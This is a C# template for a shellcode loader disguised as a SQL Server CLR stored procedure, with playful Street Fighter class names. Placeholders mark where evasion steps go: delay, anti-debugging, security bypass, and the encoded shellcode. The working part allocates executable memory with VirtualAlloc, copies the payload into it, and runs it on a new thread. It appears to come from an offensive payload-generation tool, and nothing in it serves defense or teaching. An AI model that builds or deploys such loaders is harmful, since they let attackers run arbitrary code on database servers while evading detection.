using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;
using StreetFighterAlpha;
//####USING####

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void StreetFighter()
    {
        var ryu = new Ryu(new string[]{});
    }
}

namespace StreetFighterAlpha
{

    public class Ryu
    {
        public Ryu(string[] args)
        {
            //####DELAY####

            //####ANTIDEBUG####

            //####BYPASS####

            var encoded = ####SHELLCODE####;

            //####CALL####

            Hadoken.Shoot(decoded, args);
        }
    }

    public static class Hadoken
    {

        public static void Shoot(byte[] shellcode, string[] args)
        {

            IntPtr functionAddress = Win32.VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, (UInt32)0x40);
            if (functionAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Allocation error");
            }
            Marshal.Copy(shellcode, 0, (IntPtr)(functionAddress), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            hThread = Win32.CreateThread(IntPtr.Zero, IntPtr.Zero, functionAddress, IntPtr.Zero, 0, out threadId);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error creating thread");
            }

            Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
    }

    //####CODE####

    class Win32
    {

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

       [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hModule, UInt32 timeout);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            IntPtr dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            UInt32 dwCreationFlags,
            out UInt32 lpThreadID
            );
    }


}
